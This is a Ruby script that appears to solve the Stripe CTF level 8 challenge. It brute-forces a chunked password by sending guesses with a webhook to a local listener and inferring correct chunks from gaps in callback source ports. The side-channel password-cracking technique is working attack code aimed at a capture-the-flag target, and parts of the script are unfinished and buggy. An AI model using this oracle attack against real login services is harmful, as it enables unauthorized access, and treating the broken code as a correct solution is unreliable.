require 'socket'
require 'rubygems'
require 'rest_client'

class ClientQuitError < RuntimeError; end

STDOUT.sync = true

options = {
  :primary => "http://localhost:3000/",
  :webhook => "localhost:17010",
  :num_requests => 2,
  :targets => [3,4,5,6],
  :password => [0,0,0,0],
  :server => TCPServer.open(17010),
}

#results = File.new("results.csv", 'w')

def submitRequest(opts)
  Thread.new(opts) do |opts|
    begin
      RestClient.post opts[:primary], '{"password": "' + opts[:password].join + '", "webhooks": ["' + opts[:webhook] + '"]}'
      #RestClient.post "https://level08-2.stripe-ctf.com/user-fhjkikbisq/", '{"password": "707' + num + '000000", "webhooks": ["level02-2.stripe-ctf.com:17011"]}'
    rescue Exception => e
      puts e.inspect
      puts opts.inspect
    end
    loop do
      s = opts[:server].accept
      port = s.peeraddr[1]
      s.puts "HTTP/1.1 200 OK"
      s.close
      Thread.current[:port] = port
      break
    end
  end
end

def getPorts(opts)
  possibles = []
  ports = Array.new(opts[:num_requests], false)

  for request in 0..(opts[:num_requests] - 1) do
    #opts[:request] = request
    t = submitRequest(opts).join
    ports[request] = t[:port]
    sleep(1.0/30.0)
  end


  lowest_port = 100000
  loop do
    if(!ports.include?(false))
      ports.sort!
      for y in 1..(opts[:num_requests] - 1) do
        diff = ports[y] - ports[y - 1]
        print "#{diff} "
        if(diff < lowest_port)
          lowest_port = diff
        end
      end
      #print " low: #{lowest_port}\n"
    
      #puts opts[:targets].inspect
      if(lowest_port != opts[:targets][opts[:chunk]])
        puts "Found possible chunk match: #{opts[:password].join}"
        possibles.push(opts[:password])
      end
      break
    end
  end

  possibles
end

def checkPossibles(opts, possibles)
  puts possibles.inspect
  return
  if(possibles.size != 1)
    for candidate in possibles do
      new_possibles = getPorts(opts, candidate[0], candidate[1])
    end
    checkPossibles(opts, new_possibles)
  end
  puts "Found definite chunk: #{opts[:password]}"
end

def main(opts)
  opts[:password] = Array.new(4, 0).map{|c| "%03d" % c }

  for chunk in 0..3 do
    opts[:chunk] = chunk
    for num in 0..13 do
      opts[:password][opts[:chunk]] = "%03d" % num

      puts opts[:password].join

      opts[:num] = num
      #print "#{"%03d" % opts[:num]}: "
      possibles = getPorts(opts)
      #print "\n"
    end
    checkPossibles(opts, possibles)
  end
end

main(options)

